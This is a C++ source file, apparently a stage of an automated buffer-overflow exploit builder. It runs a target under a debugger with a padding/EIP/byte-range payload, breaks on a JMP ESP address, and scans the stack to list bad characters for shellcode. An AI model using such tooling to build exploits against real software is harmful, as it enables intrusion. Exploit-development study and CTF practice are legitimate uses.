#include "Stages/BadCharacters/BadCharacters.hpp"

bool BadCharacters::hitInitialBreakpoint = false;
uint32_t BadCharacters::current = 1;
bool BadCharacters::completed = false;

bool BadCharacters::run(std::string application)
{
    Log::info(VerbosityLevel::Standard, "Finding bad characters...\n");

    // Find all bad characters
    while (!BadCharacters::completed)
    {
        BadCharacters::hitInitialBreakpoint = false;
        Log::info(VerbosityLevel::Debug, "Rerunning application to re-check bad characters...\n");
        Debugger::exec(application, { BadCharacters::getPayload() }, BadCharacters::handle);
        BadCharacters::current++;

        if (BadCharacters::current > 255)
        {
            Log::error(VerbosityLevel::Standard, "Failed to determine the bad characters for this application.\n");
            return false;
        }
    }

    // Output the found bad characters
    std::string formatted = "";
    for (uint32_t i = 0; i < Application::badCharacters.size(); i++)
    {
        char buffer[5];
        sprintf(buffer, "\\x%02x", Application::badCharacters[i]);
        formatted += std::string(buffer);
    }

    Log::success(VerbosityLevel::Standard, "Found %i bad characters", Application::badCharacters.size());
    Log::print(VerbosityLevel::Standard, ": %s\n", formatted.c_str());

    return true;
}

void BadCharacters::handle(Debugger* debugger)
{
    while(true)
    {
        // Wait for process state to change
        ProcessState status = debugger->getProcess()->wait();

        if (status.isPaused())
        {
            // If we have hit a trap
            if (status.getPauseSignal() == SIGTRAP)
            {
                // If it's the initial breakpoint, add a breakpoint on JMP ESP
                // then continue.
                if (!BadCharacters::hitInitialBreakpoint)
                {
                    BadCharacters::hitInitialBreakpoint = true;
                    Log::info(VerbosityLevel::Debug, "Adding breakpoint to JMP ESP (0x%x)\n", Application::jmpEsp);
                    debugger->addBreakpoint(Application::jmpEsp);
                    debugger->pContinue();
                    continue;
                }

                // Otherwise we have hit JMP ESP
                Log::info(VerbosityLevel::Debug, "Hit breakpoint at JMP ESP (0x%x)\n", Application::jmpEsp);

                // Check each value of the bad characters.
                user_regs_struct registers;
                debugger->getRegisters(&registers);
                uint32_t esp = (uint32_t)registers.esp;

                // Read 4 bytes at a time
                for (uint32_t i = 1; i <= 255; i += 4)
                {
                    uint32_t offset = (i - 1);
                    uint32_t bytes = debugger->read((void*)(esp + offset));

                    // Check each byte
                    for (uint32_t j = 0; j < 4; j++)
                    {
                        uint8_t byte = ((bytes >> (8* j)) & 0xff);
                        
                        // Stop if passed end
                        if (i + j > 255)
                            break;
                        
                        // Skip if bad character has already been found
                        if (std::find(Application::badCharacters.begin(), Application::badCharacters.end(), (uint8_t)(i + j)) != Application::badCharacters.end())
                        {
                            Log::info(VerbosityLevel::VeryVerbose, "Skipping 0x%02x as it is an existing bad character\n", (uint8_t)(i + j));
                            continue;
                        }

                        // If bad character, log and rerun.
                        if (i + j != byte)
                        {
                            Log::success(VerbosityLevel::Verbose, "Found 0x%02x as a new bad character\n", (uint8_t)(i + j));
                            Application::badCharacters.push_back(i + j);
                            debugger->pKill();
                            return;
                        }
                    }
                }
                BadCharacters::completed = true;
                debugger->pKill();
                return;
            }
        }
        else if (status.hasExited())
            return;
    }
}

std::string BadCharacters::getPayload()
{
    Payload* payloadBuilder = Payload::builder()
        ->padding()
        ->eip()
        ->badCharacters();
    std::string payload = payloadBuilder->get();
    delete payloadBuilder;
    return payload;
}